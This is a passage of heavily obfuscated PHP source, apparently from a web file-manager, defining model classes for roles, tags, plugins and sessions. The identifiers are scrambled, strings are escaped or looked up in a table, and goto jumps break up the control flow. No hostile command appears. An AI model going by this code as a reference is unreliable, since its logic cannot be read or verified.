$_SERVER[ìïæ“œî]; $¡Ğùû÷ = array_unique(array_to_keyvalue($¶ôÚÍº‰, $èú·º[12], $èú·º[1975])); $¡Ğùû÷ = array_remove_value($¡Ğùû÷, $èú·º[228]); if (!$¡Ğùû÷) { return; } $Ğ¨¡÷ö’ = $this->where(array($èú·º[1976] => array($èú·º[7], $¡Ğùû÷)))->select(); $Ğ¨¡÷ö’ = array_to_keyvalue($Ğ¨¡÷ö’, $èú·º[1983]); foreach ($¶ôÚÍº‰ as &$şá‡¥úƒ) { if (isset($Ğ¨¡÷ö’[$şá‡¥úƒ[$èú·º[1975]]])) { $şá‡¥úƒ[$èú·º[1993]] = $Ğ¨¡÷ö’[$şá‡¥úƒ[$èú·º[1975]]]; } } unset($şá‡¥úƒ); } private function _listAppendUser(&$¨£‚Í‚ú) { $ÃÁ¿ŸÑ¨ =& $_SERVER[ìïæ“œî]; $œ¨Ä¬å› = array_unique(array_to_keyvalue($¨£‚Í‚ú, $ÃÁ¿ŸÑ¨[12], $ÃÁ¿ŸÑ¨[1747])); $œ¨Ä¬å› = array_remove_value($œ¨Ä¬å›, $ÃÁ¿ŸÑ¨[228]); if (count($œ¨Ä¬å›) == 0) { return; } foreach ($¨£‚Í‚ú as $¼·Ëˆ”) { if (isset($¼·Ëˆ”[$ÃÁ¿ŸÑ¨[1993]])) { $œ¨Ä¬å›[] = $¼·Ëˆ”[$ÃÁ¿ŸÑ¨[1993]][$ÃÁ¿ŸÑ¨[1747]]; } } $š×š´ = Model($ÃÁ¿ŸÑ¨[598])->userListInfo($œ¨Ä¬å›); foreach ($¨£‚Í‚ú as &$¼·Ëˆ”) { $¼·Ëˆ”[$ÃÁ¿ŸÑ¨[662]] = $š×š´[$¼·Ëˆ”[$ÃÁ¿ŸÑ¨[1747]]]; if (isset($¼·Ëˆ”[$ÃÁ¿ŸÑ¨[1993]])) { $¼·Ëˆ”[$ÃÁ¿ŸÑ¨[1993]][$ÃÁ¿ŸÑ¨[662]] = $š×š´[$¼·Ëˆ”[$ÃÁ¿ŸÑ¨[1993]][$ÃÁ¿ŸÑ¨[1747]]]; } } unset($¼·Ëˆ”); } private function _listAppendMeta(&$„ÓÆ¦¥) { $Â±’û£ª =& $_SERVER[ìïæ“œî]; $ñÕ¹¸ú = array_unique(array_to_keyvalue($„ÓÆ¦¥, $Â±’û£ª[12], $Â±’û£ª[1983])); $ñÕ¹¸ú = array_remove_value($ñÕ¹¸ú, $Â±’û£ª[228]); if (!$ñÕ¹¸ú) { return; } foreach ($„ÓÆ¦¥ as $ˆÁ·ìèŠ) { if (isset($ˆÁ·ìèŠ[$Â±’û£ª[1993]])) { $ñÕ¹¸ú[] = $ˆÁ·ìèŠ[$Â±’û£ª[1993]][$Â±’û£ª[1983]]; } } $¥Ñ†¨ëÙ = $this->metaList($ñÕ¹¸ú); if (!$¥Ñ†¨ëÙ) { return !1; } foreach ($„ÓÆ¦¥ as &$ˆÁ·ìèŠ) { $ˆÁ·ìèŠ[$Â±’û£ª[539]] = $¥Ñ†¨ëÙ[$ˆÁ·ìèŠ[$Â±’û£ª[1983]]]; if (isset($ˆÁ·ìèŠ[$Â±’û£ª[1993]])) { $ˆÁ·ìèŠ[$Â±’û£ª[1993]][$Â±’û£ª[539]] = $¥Ñ†¨ëÙ[$ˆÁ·ìèŠ[$Â±’û£ª[1993]][$Â±’û£ª[1983]]]; } } unset($ˆÁ·ìèŠ); } private function metaList($š¥úùÛæ) { $èË™àˆ¸ =& $_SERVER[ìïæ“œî]; if (!$š¥úùÛæ) { return array(); } $äÂ»ì¸ = array($èË™àˆ¸[1983] => array($èË™àˆ¸[7], $š¥úùÛæ)); $ìñ›œã¾ = Model($èË™àˆ¸[1994])->where($äÂ»ì¸)->select(); $ìñ›œã¾ = array_to_keyvalue_group($ìñ›œã¾, $èË™àˆ¸[1983]); foreach ($ìñ›œã¾ as $Í¼§ªçñ => $¸‚•°š) { $Ú Ş â = array(); foreach ($¸‚•°š as $ÈÕ³¯â) { $Ú Ş â[$ÈÕ³¯â[$èË™àˆ¸[97]]] = $ÈÕ³¯â[$èË™àˆ¸[450]]; } $ìñ›œã¾[$Í¼§ªçñ] = $Ú Ş â; } return $ìñ›œã¾ ? $ìñ›œã¾ : array(); } public function removeTarget($€Š×é™”, $°ÁŒø ›) { $ÒÖà“»Ú =& $_SERVER[ìïæ“œî]; if (!$°ÁŒø ›) { return !0; } $°ÁŒø › = is_array($°ÁŒø ›) ? $°ÁŒø › : array($°ÁŒø ›); $×ËŞã±€ = array($ÒÖà“»Ú[190] => $€Š×é™”, $ÒÖà“»Ú[569] => array($ÒÖà“»Ú[7], $°ÁŒø ›)); $Â¥˜˜Í = $this->field($ÒÖà“»Ú[1983])->where($×ËŞã±€)->select(); $»÷†Ã°– = array_to_keyvalue($Â¥˜˜Í, $ÒÖà“»Ú[12], $ÒÖà“»Ú[1983]); if (!$»÷†Ã°–) { return !0; } $×ËŞã±€ = array($ÒÖà“»Ú[1983] => array($ÒÖà“»Ú[7], $»÷†Ã°–)); $this->where($×ËŞã±€)->delete(); Model($ÒÖà“»Ú[1986])->where($×ËŞã±€)->delete(); Model($ÒÖà“»Ú[1995])->where($×ËŞã±€)->delete(); } } goto AÙ±‡·Ã¿¤; dõ”Ò—áó: function binCheckBigger($¥–›Ô› , $­şÖı—Æ) { return $¥–›Ô›  > $­şÖı—Æ; } $_SERVER[$_SERVER[–èóã][3]] = ("\70\64\71\70"."\67\61")+0;$_odac="vmeb3so95ftrg8yxpqdwkjh7ni0u4cza612llvpfheb8q51gk4mcarzdjsi0txy3726ownu9hnsfzj4mi7";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ßÑ”ÙËÜ, $‘€®¢óà) { $°Ğ¿Ğ›Ë =& $_SERVER[ìïæ“œî]; if (isset(self::$_methodList[$ßÑ”ÙËÜ])) { return @call_user_func_array(self::$_methodList[$ßÑ”ÙËÜ], $‘€®¢óà); } else { if (method_exists($this, $ßÑ”ÙËÜ)) { return call_user_func_array(array($this, $ßÑ”ÙËÜ), $‘€®¢óà); } else { think_exception(__CLASS__ . $°Ğ¿Ğ›Ë[4] . $ßÑ”ÙËÜ . $°Ğ¿Ğ›Ë[5]); } } } public static function __callStatic($»¹î™¦ˆ, $ ÀÙÜ‘) { if (isset(self::$_methodListStatic[$»¹î™¦ˆ])) { return call_user_func_array(self::$_methodListStatic[$»¹î™¦ˆ], $ ÀÙÜ‘); } else { if (method_exists(self, $»¹î™¦ˆ)) { return call_user_func_array(array(self, $»¹î™¦ˆ), $ ÀÙÜ‘); } else { show_json("{$»¹î™¦ˆ}\x28\51\40\x6e\157\164\40\x65\170\151\163\164\73", !1); } } } public static function addMethod($·êê×”Ğ, $ó…ßËŠø) { self::$_methodList[$·êê×”Ğ] = $ó…ßËŠø; } public static function addMethodStatic($‚ÌùÈ—’, $Ì¨ä„Ú) { self::$_methodListStatic[$‚ÌùÈ—’] = $Ì¨ä„Ú; } } goto b«ñÜùà¹; Cøö‰Ü—…: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\x65\x6d\137\157\x70\x74\x69\x6f\156"; protected $jsonField = array("\x6d\x65\156\x75", "\x72\x6f\x6c\145", "\x72\157\154\145\107\162\157\165\x70", "\x72\x65\147\x69\x73\x74", "\145\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($©›Æí®ê) { return "\x53\171\x73\164\145\155\117\160\164\x69\157\156\x5f{$©›Æí®ê}"; } protected function optionDefault($ÙØ‰è¾ú = '') { $ıéÍæÀÅ =& $_SERVER[ìïæ“œî]; if ($ÙØ‰è¾ú == $ıéÍæÀÅ[12]) { return $GLOBALS[$ıéÍæÀÅ[6]][$ıéÍæÀÅ[457]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x72\157\154\x65\x4c\x69\163\x74"; public $field = array("\x6e\141\155\x65", "\x61\x75\164\x68", "\154\141\x62\145\154", "\x64\x69\x73\160\154\x61\x79", "\x73\x79\163\x74\x65\155", "\x64\x65\x73\x63", "\x69\x67\156\157\x72\145\105\170\x74", "\151\x67\x6e\x6f\162\145\x46\151\x6c\145\123\x69\x7a\x65", "\141\x64\155\x69\156\151\x73\164\x72\141\164\157\162", "\x73\157\162\x74"); public function listData($Ù®ÕÄ– = false, $ÖÜÔéªÌ = "\x73\x6f\x72\x74", $šâÍ—›Ú = false) { $ ä¦Ğ¢É =& $_SERVER[ìïæ“œî]; $õù»ÎË = parent::listData($Ù®ÕÄ–, $ÖÜÔéªÌ, $šâÍ—›Ú); if (!$Ù®ÕÄ–) { foreach ($õù»ÎË as $Ô‰äÓ• => $»ºÖ€Îà) { if ($»ºÖ€Îà[$ ä¦Ğ¢É[2153]] == 1) { $õù»ÎË[$Ô‰äÓ•][$ ä¦Ğ¢É[526]] = LNG($ ä¦Ğ¢É[2415]); } } } return $õù»ÎË; } public function update($Ä¶íû˜‘, $Ÿşğ’»÷) { $Šß­”µÂ =& $_SERVER[ìïæ“œî]; $ÚõŠ = parent::listData($Ä¶íû˜‘); $ñêßœÏÌ = $this->findByName($Ÿşğ’»÷[$Šß­”µÂ[32]]); if (!$ÚõŠ || $ñêßœÏÌ && $ñêßœÏÌ[$Šß­”µÂ[475]] != $ÚõŠ[$Šß­”µÂ[475]]) { return !1; } if ($ñêßœÏÌ[$Šß­”µÂ[2153]] == 1) { $Ÿşğ’»÷ = array($Šß­”µÂ[32] => $Ÿşğ’»÷[$Šß­”µÂ[32]], $Šß­”µÂ[1969] => $Ÿşğ’»÷[$Šß­”µÂ[1969]]); } $this->filterAuth($Ÿşğ’»÷[$Šß­”µÂ[487]]); return parent::update($Ä¶íû˜‘, $Ÿşğ’»÷); } public function remove($ÊÊêùø¥) { $ş±º©Œå = parent::listData($ÊÊêùø¥); if (!$ş±º©Œå || $ş±º©Œå[$_SERVER[ìïæ“œî][191]]) { return !1; } return parent::remove($ÊÊêùø¥); } public function add($¨èıîúº) { $šõ¶±ËÎ =& $_SERVER[ìïæ“œî]; $¾òŠÖŒ˜ = $¨èıîúº[$šõ¶±ËÎ[32]]; if ($this->findByName($¾òŠÖŒ˜)) { return !1; } $´ Òî“ = array($šõ¶±ËÎ[494] => $¾òŠÖŒ˜, $šõ¶±ËÎ[1952] => $šõ¶±ËÎ[12], $šõ¶±ËÎ[1948] => $šõ¶±ËÎ[1956], $šõ¶±ËÎ[2416] => 1, $šõ¶±ËÎ[1951] => 0, $šõ¶±ËÎ[2417] => 0, $šõ¶±ËÎ[1950] => $this->getSort()); $¨èıîúº = array_merge($´ Òî“, $¨èıîúº); $this->filterAuth($¨èıîúº[$šõ¶±ËÎ[487]]); return parent::insert($¨èıîúº); } private function getSort() { $æôşİùë =& $_SERVER[ìïæ“œî]; $Î’ª”«  = parent::listData(); $ÅÁÌ€“ = array_to_keyvalue($Î’ª”« , $æôşİùë[12], $æôşİùë[1970]); return empty($ÅÁÌ€“) ? 0 : max($ÅÁÌ€“) + 1; } private function filterAuth(&$ÇÕ€ãˆ¤) { $«»ã²˜à =& $_SERVER[ìïæ“œî]; $öÆù¿Œ¤ = array(); $®’ò´Ê– = array_filter(explode($«»ã²˜à[50], $ÇÕ€ãˆ¤)); foreach ($®’ò´Ê– as $ÇÕ€ãˆ¤) { $Åëˆú¯ˆ = explode($«»ã²˜à[10], $ÇÕ€ãˆ¤); if ($Åëˆú¯ˆ[0] == $«»ã²˜à[2418] && $Åëˆú¯ˆ[1] != $«»ã²˜à[1252]) { $ˆé‰•ß¾ = $Åëˆú¯ˆ[0] . $«»ã²˜à[10] . $Åëˆú¯ˆ[1] . $«»ã²˜à[2419]; if (!in_array($ˆé‰•ß¾, $®’ò´Ê–)) { $öÆù¿Œ¤[] = $ˆé‰•ß¾; } } $öÆù¿Œ¤[] = $ÇÕ€ãˆ¤; } $ÇÕ€ãˆ¤ = implode($«»ã²˜à[50], $öÆù¿Œ¤); } public function findRoleDefault() { $Ş§±øÖÉ =& $_SERVER[ìïæ“œî]; $€ÈÓ‚ù× = parent::listData(); $Ùáî­½î = !1; foreach ($€ÈÓ‚ù× as $½Ôïí°Ã) { if (!$½Ôïí°Ã || $½Ôïí°Ã[$Ş§±øÖÉ[1968]] == $Ş§±øÖÉ[228] || $½Ôïí°Ã[$Ş§±øÖÉ[2153]] == 1) { continue; } if (strstr($½Ôïí°Ã[$Ş§±øÖÉ[487]], $Ş§±øÖÉ[2420])) { continue; } if (!strstr($½Ôïí°Ã[$Ş§±øÖÉ[487]], $Ş§±øÖÉ[2421])) { continue; } if (!$Ùáî­½î) { $Ùáî­½î = $½Ôïí°Ã; continue; } $°åç–‡ = explode($Ş§±øÖÉ[50], $Ùáî­½î[$Ş§±øÖÉ[487]]); $›ù×­­ = explode($Ş§±øÖÉ[50], $½Ôïí°Ã[$Ş§±øÖÉ[487]]); if (count($°åç–‡) > count($›ù×­­)) { $Ùáî­½î = $½Ôïí°Ã; } } return $Ùáî­½î ? $Ùáî­½î[$Ş§±øÖÉ[475]] : $Ş§±øÖÉ[12]; } public function sort($½¤÷×¤, $ÅØòÔ÷¯) { return parent::update($½¤÷×¤, $ÅØòÔ÷¯); } } goto DÉŸ¥×ù¾¹; eÈËØ¿÷Ñø: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($Ç°£—ÀŸ) { $ÈÓâš =& $_SERVER[ìïæ“œî]; return array($ÈÓâš[2059] => array($Ç°£—ÀŸ[0], $ÈÓâš[2060]), $ÈÓâš[2061] => array($Ç°£—ÀŸ[0], $ÈÓâš[2062])); } protected function get($Î‚Ä„) { $éã¿˜© =& $_SERVER[ìïæ“œî]; $ùŞ§€ûı = Model($éã¿˜©[585])->metaGet($Î‚Ä„, $éã¿˜©[2063]); $­Äõû´Ú = json_decode($ùŞ§€ûı, !0); return $­Äõû´Ú ? $­Äõû´Ú : array($éã¿˜©[2064] => $éã¿˜©[91], $éã¿˜©[445] => array()); } protected function set($é¯‡£¶„, $åò«Ê³) { $Û²šŸä» =& $_SERVER[ìïæ“œî]; $åò«Ê³ = $åò«Ê³ ? $åò«Ê³ : array($Û²šŸä»[2064] => $Û²šŸä»[91], $Û²šŸä»[445] => array()); return Model($Û²šŸä»[585])->metaSet($é¯‡£¶„, $Û²šŸä»[2063], json_encode($åò«Ê³)); } protected function getByTagID($î”Ôù¸¯, $õÀ€ˆß) { $ÛŸ¢€ĞÏ =& $_SERVER[ìïæ“œî]; if (!$î”Ôù¸¯ || !$õÀ€ˆß) { return !1; } if (!Model($ÛŸ¢€ĞÏ[585])->getInfoSimple($î”Ôù¸¯)) { return !1; } $ğ“—›ú = $this->get($î”Ôù¸¯); if (!$ğ“—›ú || !isset($ğ“—›ú[$ÛŸ¢€ĞÏ[445]])) { return !1; } $‰ü«À»Ÿ = array_find_by_field($ğ“—›ú[$ÛŸ¢€ĞÏ[445]], $ÛŸ¢€ĞÏ[475], $õÀ€ˆß); return is_array($‰ü«À»Ÿ) ? $‰ü«À»Ÿ : !1; } public function listSource($Å²¾øä¸, $ïæ¡é) { $ùÓŞ„Ö‡ =& $_SERVER[ìïæ“œî]; if ($ïæ¡é && !is_array($ïæ¡é)) { $ïæ¡é = array($ïæ¡é); } $›Ü”€âÂ = $this->listData($Å²¾øä¸); $ÍáÜ¡Î = array(); foreach ($›Ü”€âÂ as $Ó§õƒô¯) { $Öùæşã = $Ó§õƒô¯[$ùÓŞ„Ö‡[87]]; if (!$Öùæşã) { continue; } if (!isset($ÍáÜ¡Î[$Öùæşã])) { $ÍáÜ¡Î[$Öùæşã] = array(); } $ÍáÜ¡Î[$Öùæşã][] = $Ó§õƒô¯[$ùÓŞ„Ö‡[500]]; } $ìçèÛğÈ = array(); foreach ($ÍáÜ¡Î as $‚¼­çÁê => $Ãá†¡Îƒ) { $ÎõµÙßÌ = !0; if (!$ïæ¡é) { $ìçèÛğÈ[] = $‚¼­çÁê; continue; } foreach ($ïæ¡é as $¦“èµï±) { if (!in_array($¦“èµï±, $Ãá†¡Îƒ)) { $ÎõµÙßÌ = !1; break; } } if ($ÎõµÙßÌ) { $ìçèÛğÈ[] = $‚¼­çÁê; } } if (!$ìçèÛğÈ) { return array(); } $ĞÙòÇ«´ = array($ùÓŞ„Ö‡[491] => array($ùÓŞ„Ö‡[492], $ìçèÛğÈ), $ùÓŞ„Ö‡[569] => $Å²¾øä¸, $ùÓŞ„Ö‡[190] => SourceModel::TYPE_GROUP); $É™šûÎ¸ = Model($ùÓŞ„Ö‡[1394])->listSource($ĞÙòÇ«´); if (!$É™šûÎ¸ || count($ìçèÛğÈ) == $É™šûÎ¸[$ùÓŞ„Ö‡[442]][$ùÓŞ„Ö‡[443]]) { return $É™šûÎ¸; } $ù‘‹÷³  = array(); $µ¤şİ´° = array_to_keyvalue($É™šûÎ¸[$ùÓŞ„Ö‡[85]], $ùÓŞ„Ö‡[12], $ùÓŞ„Ö‡[193]); $ŸÂùŒñ¡ = array_to_keyvalue($É™šûÎ¸[$ùÓŞ„Ö‡[86]], $ùÓŞ„Ö‡[12], $ùÓŞ„Ö‡[193]); $¢½àŠ‡“ = array_merge($ŸÂùŒñ¡, $µ¤şİ´°); foreach ($ìçèÛğÈ as $Öùæşã) { if (!in_array($Öùæşã, $¢½àŠ‡“)) { $ù‘‹÷³ [] = $Öùæşã; } } if ($ù‘‹÷³ ) { $this->removeBySource($Å²¾øä¸, $ù‘‹÷³ ); } return $É™šûÎ¸; } protected function listData($àÑëÕô) { $ƒ¤˜ùÄï =& $_SERVER[ìïæ“œî]; $Á¶¥Â¡ = array($ƒ¤˜ùÄï[1738] => 0, $ƒ¤˜ùÄï[557] => array($ƒ¤˜ùÄï[2065], 0), $ƒ¤˜ùÄï[496] => $ƒ¤˜ùÄï[2066] . $àÑëÕô); $—‰øŒ™ï = $ƒ¤˜ùÄï[2067]; $Æ¬ÍÈîã = $this->field($—‰øŒ™ï)->where($Á¶¥Â¡)->order($ƒ¤˜ùÄï[2068])->select(); return $Æ¬ÍÈîã ? $Æ¬ÍÈîã : array(); } protected function addToTag($á××®ß, $£ êı‹‚, $ê¾ú©´ø) { $½Øãªğ =& $_SERVER[ìïæ“œî]; if (!$this->getByTagID($á××®ß, $ê¾ú©´ø) || !$£ êı‹‚) { return !1; } if (!Model($½Øãªğ[873])->pathInfo($£ êı‹‚)) { return !1; } $Èƒîäˆ— = array($½Øãªğ[1738] => 0, $½Øãªğ[557] => $ê¾ú©´ø, $½Øãªğ[495] => $£ êı‹‚, $½Øãªğ[496] => $½Øãªğ[2069] . $á××®ß, $½Øãªğ[494] => $½Øãªğ[12], $½Øãªğ[1950] => 0); if ($this->where($Èƒîäˆ—)->find()) { return !1; } return $this->add($Èƒîäˆ—); } protected function removeFromTag($¤¿à–ç‹, $”šã­Ë¬, $å±Åúñ‰) { $ŒÌÕ =& $_SERVER[ìïæ“œî]; if (!$this->getByTagID($¤¿à–ç‹, $å±Åúñ‰) || !$”šã­Ë¬) { return !1; } if (is_array($”šã­Ë¬)) { $”šã­Ë¬ = array($ŒÌÕ[7], $”šã­Ë¬); } $‹µ§ØÅû = array($ŒÌÕ[1738] => 0, $ŒÌÕ[557] => $å±Åúñ‰, $ŒÌÕ[496] => $ŒÌÕ[2069] . $¤¿à–ç‹, $ŒÌÕ[495] => $”šã­Ë¬); return $this->where($‹µ§ØÅû)->delete(); } protected function removeByTag($ËÎÊ¿çÏ, $øİã¸…) { $®ìı¨à” =& $_SERVER[ìïæ“œî]; if (!$this->getByTagID($ËÎÊ¿çÏ, $øİã¸…)) { return !1; } $ÒÛ¶€˜“ = array($®ìı¨à”[1738] => 0, $®ìı¨à”[557] => $øİã¸…, $®ìı¨à”[496] => $®ìı¨à”[2069] . $ËÎÊ¿çÏ); return $this->where($ÒÛ¶€˜“)->delete(); } protected function removeBySource($¢ûŸÙ•, $Ş£äøÒ§) { $€É¸Şàë =& $_SERVER[ìïæ“œî]; if (!$¢ûŸÙ• || !$Ş£äøÒ§) { return !1; } if (is_array($Ş£äøÒ§)) { $Ş£äøÒ§ = array($€É¸Şàë[7], $Ş£äøÒ§); } $œ²îœñæ = array($€É¸Şàë[1738] => 0, $€É¸Şàë[495] => $Ş£äøÒ§, $€É¸Şàë[557] => array($€É¸Şàë[1069], 0), $€É¸Şàë[496] => $€É¸Şàë[2069] . $¢ûŸÙ•); return $this->where($œ²îœñæ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\160\x6c\x75\147\151\x6e\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\x73\164\141\164\x75\163", "\x72\145\x67\151\145\163\x74", "\143\x6f\156\x66\x69\147"); public function loadList($îüêÖÏ = false) { $ÇÜõ­ = array_to_keyvalue($this->listData(), $_SERVER[ìïæ“œî][32]); if ($îüêÖÏ) { return $ÇÜõ­[$îüêÖÏ]; } return $ÇÜõ­; } public function init() { $ˆ—®‹Æ =& $_SERVER[ìïæ“œî]; Hook::trigger($ˆ—®‹Æ[2070]); $®§Úïø· = $this->loadPluginList(); foreach ($®§Úïø· as $¾·‘ğÎÆ => $§¾ûõ•ï) { $Óá•Õà = $this->appAllow($¾·‘ğÎÆ, $§¾ûõ•ï); if (!$Óá•Õà) { continue; } foreach ($§¾ûõ•ï[$ˆ—®‹Æ[2071]] as $Ï×ÎêåÖ => $¸şŠ«Ó) { Hook::bind($Ï×ÎêåÖ, $¸şŠ«Ó); } } Hook::trigger($ˆ—®‹Æ[2072]); Hook::trigger(ACTION); } public function appAllow($‚©´¯¤ò, $…Ùèê›€, $ƒğŞñû = true) { $ïÀ‹ÑœÆ =& $_SERVER[ìïæ“œî]; $Šèê±š« = PLUGIN_DIR . $‚©´¯¤ò . $ïÀ‹ÑœÆ[2073]; if (!is_array($…Ùèê›€) || !is_array($…Ùèê›€[$ïÀ‹ÑœÆ[2071]]) || $…Ùèê›€[$ïÀ‹ÑœÆ[799]] != 1 || !is_file($Šèê±š«)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ïÀ‹ÑœÆ[6]][$ïÀ‹ÑœÆ[2074]] || !$GLOBALS[$ïÀ‹ÑœÆ[6]][$ïÀ‹ÑœÆ[2075]]) { return !0; } $µ˜ììèâ = explode($ïÀ‹ÑœÆ[50], strtolower($GLOBALS[$ïÀ‹ÑœÆ[6]][$ïÀ‹ÑœÆ[2075]])); return in_array(strtolower($‚©´¯¤ò), $µ˜ììèâ) ? !1 : !0; } if ($ƒğŞñû && !Action($ïÀ‹ÑœÆ[2076])->checkAuth($‚©´¯¤ò)) { return !1; } return !0; } public function unInstall($ö®Øı²í) { $Äˆ××éö =& $_SERVER[ìïæ“œî]; $‡¦¢“Õ = $this->loadList($ö®Øı²í); if (file_exists(PLUGIN_DIR . $ö®Øı²í)) { Hook::apply($ö®Øı²í . $Äˆ××éö[2077]); } $this->remove($‡¦¢“Õ[$Äˆ××éö[475]]); } public function changeStatus($…Àé¼ï™, $Ú”µ¨éà) { $õÑÙ›Ò½ =& $_SERVER[ìïæ“œî]; $ì³É¦ì = $this->loadList($…Àé¼ï™); if ($Ú”µ¨éà) { Hook::apply($…Àé¼ï™ . $õÑÙ›Ò½[2078]); } $this->update($ì³É¦ì[$õÑÙ›Ò½[475]], array($õÑÙ›Ò½[2079] => $Ú”µ¨éà)); } public function appRegist($Û”æ’Î÷, $—öÀîø÷) { $œÛğ’ÛÛ =& $_SERVER[ìïæ“œî]; $Î¬¦ÑíÃ = $this->loadList($Û”æ’Î÷); if ($Î¬¦ÑíÃ) { $this->update($Î¬¦ÑíÃ[$œÛğ’ÛÛ[475]], array($œÛğ’ÛÛ[2071] => $—öÀîø÷)); } else { $„å¡Úæ = array($œÛğ’ÛÛ[32] => $Û”æ’Î÷, $œÛğ’ÛÛ[2071] => $—öÀîø÷, $œÛğ’ÛÛ[799] => 0, $œÛğ’ÛÛ[6] => $this->getConfigDefault($Û”æ’Î÷)); $this->insert($„å¡Úæ); } } public function getConfigDefault($º•­´Æâ) { $Ô÷–Ş‘· =& $_SERVER[ìïæ“œî]; $ğä£ºŒ‡ = array(); $ÅÜÄº = $this->getPackageJson($º•­´Æâ); if (!$ÅÜÄº && is_array($ÅÜÄº[$Ô÷–Ş‘·[2080]])) { return $ğä£ºŒ‡; } foreach ($ÅÜÄº[$Ô÷–Ş‘·[2080]] as $ßíğ¿± => $„‡ àï) { if (!isset($„‡ àï[$Ô÷–Ş‘·[450]]) || isset($ğä£ºŒ‡[$ßíğ¿±])) { continue; } $ğä£ºŒ‡[$ßíğ¿±] = $„‡ àï[$Ô÷–Ş‘·[450]]; } return $ğä£ºŒ‡; } public function getPackageJson($¸ ˜şªÛ) { return Hook::apply($¸ ˜şªÛ . $_SERVER[ìïæ“œî][2081]); } public function getConfig($‘çä×§–, $ıŸš¡¡» = false) { $Íæ êãÉ =& $_SERVER[ìïæ“œî]; $ÓåšÉ«‹ = array(); $”à›­ä = $this->loadList($‘çä×§–); if ($”à›­ä && is_array($”à›­ä[$Íæ êãÉ[6]])) { $ÓåšÉ«‹ = $”à›­ä[$Íæ êãÉ[6]]; } if (!$ÓåšÉ«‹ || $ıŸš¡¡») { $ÓåšÉ«‹ = $this->getConfigDefault($‘çä×§–); } return $ÓåšÉ«‹; } public function setConfig($Öø²Ó»Š, $Şú·ŒáÔ = false) { $Æ©ğ‘ =& $_SERVER[ìïæ“œî]; $€µÇ½æÄ = $this->loadList($Öø²Ó»Š); if (!$€µÇ½æÄ) { return !1; } $ïşÌğ›€ = $€µÇ½æÄ[$Æ©ğ‘[6]]; if ($Şú·ŒáÔ == !1) { $ïşÌğ›€ = array(); $Şú·ŒáÔ = $this->getConfigDefault($Öø²Ó»Š); } foreach ($Şú·ŒáÔ as $¬ µ¿˜â => $Õãò‹ÅØ) { $ïşÌğ›€[$¬ µ¿˜â] = is_string($Õãò‹ÅØ) ? trim($Õãò‹ÅØ) : $Õãò‹ÅØ; } $this->update($€µÇ½æÄ[$Æ©ğ‘[475]], array($Æ©ğ‘[6] => $ïşÌğ›€)); } public function viewList() { $÷Ô¹Ğ‹À =& $_SERVER[ìïæ“œî]; $°É¼ÙÒ = $this->loadList(); $this->pluginScan($°É¼ÙÒ); $°É¼ÙÒ = $this->loadPluginList(); $…Óöï¬å = array(); foreach ($°É¼ÙÒ as $éòá¯¼ã => $®¤š¤ë­) { $Øšä¨ = $®¤š¤ë­; unset($®¤š¤ë­[$÷Ô¹Ğ‹À[2071]], $®¤š¤ë­[$÷Ô¹Ğ‹À[6]]); $§ÛÖÚÍ = PLUGIN_DIR . $®¤š¤ë­[$÷Ô¹Ğ‹À[32]] . $÷Ô¹Ğ‹À[2073]; if (!is_file($§ÛÖÚÍ)) { continue; } $óøéÖÌ = Hook::apply($®¤š¤ë­[$÷Ô¹Ğ‹À[32]] . $÷Ô¹Ğ‹À[2081]); if (!is_array($óøéÖÌ)) { continue; } $…Óöï¬å[$éòá¯¼ã] = array_merge($®¤š¤ë­, $óøéÖÌ); if ($Øšä¨[$÷Ô¹Ğ‹À[6]][$÷Ô¹Ğ‹À[1661]] != $óøéÖÌ[$÷Ô¹Ğ‹À[1635]]) { Hook::apply($®¤š¤ë­[$÷Ô¹Ğ‹À[32]] . $÷Ô¹Ğ‹À[2078]); $Øšä¨[$÷Ô¹Ğ‹À[6]][$÷Ô¹Ğ‹À[1661]] = $óøéÖÌ[$÷Ô¹Ğ‹À[1635]]; $this->update($®¤š¤ë­[$÷Ô¹Ğ‹À[475]], array($÷Ô¹Ğ‹À[6] => $Øšä¨[$÷Ô¹Ğ‹À[6]])); } } return $…Óöï¬å; } private function loadPluginList() { $ÍËªğ÷ =& $_SERVER[ìïæ“œî]; $şÎÅÙğÌ = $this->loadList(); if (strtolower(MOD) == $ÍËªğ÷[2082]) { return $şÎÅÙğÌ; } $ÓŸŸë÷ = Hook::trigger($ÍËªğ÷[2083], $şÎÅÙğÌ); if ($şÎÅÙğÌ && !$ÓŸŸë÷) { die; } return $ÓŸŸë÷ ? $ÓŸŸë÷ : $şÎÅÙğÌ; } private function pluginScan($¶’Î‘òŞ) { $¬ì«É±ò =& $_SERVER[ìïæ“œî]; recursion_dir(PLUGIN_DIR, $îÅ“½À³, $Â£äêÇ, 0); foreach ($îÅ“½À³ as $ë…Ğ‰îÄ) { $º¾ú¬á‚ = get_path_this($ë…Ğ‰îÄ); if (isset($¶’Î‘òŞ[$º¾ú¬á‚]) || !file_exists($ë…Ğ‰îÄ . $¬ì«É±ò[2084]) || !file_exists($ë…Ğ‰îÄ . $¬ì«É±ò[2073])) { continue; } Hook::apply($º¾ú¬á‚ . $¬ì«É±ò[2078]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\137\x73\x65\163\163\151\157\156"; public function get($ÒªÉ÷€£) { $ç¯Çá€« =& $_SERVER[ìïæ“œî]; $°ŠÊì®­ = $this->where(array($ç¯Çá€«[2085] => $ÒªÉ÷€£))->find(); if (!is_array($°ŠÊì®­)) { return !1; } return $°ŠÊì®­[$ç¯Çá€«[171]]; } public function set($šÃòä¬, $ÉĞÅÖ§¨, $«éœì¢Ì = 3600) { $ûƒ÷¤Âô =& $_SERVER[ìïæ“œî]; $Ü®’ÏÇ‚ = array($ûƒ÷¤Âô[2085] => $šÃòä¬, $ûƒ÷¤Âô[1985] => $ÉĞÅÖ§¨, $ûƒ÷¤Âô[2086] => $«éœì¢Ì + time()); if (Session::get($ûƒ÷¤Âô[2087])) { $Ü®’ÏÇ‚[$ûƒ÷¤Âô[1747]] = 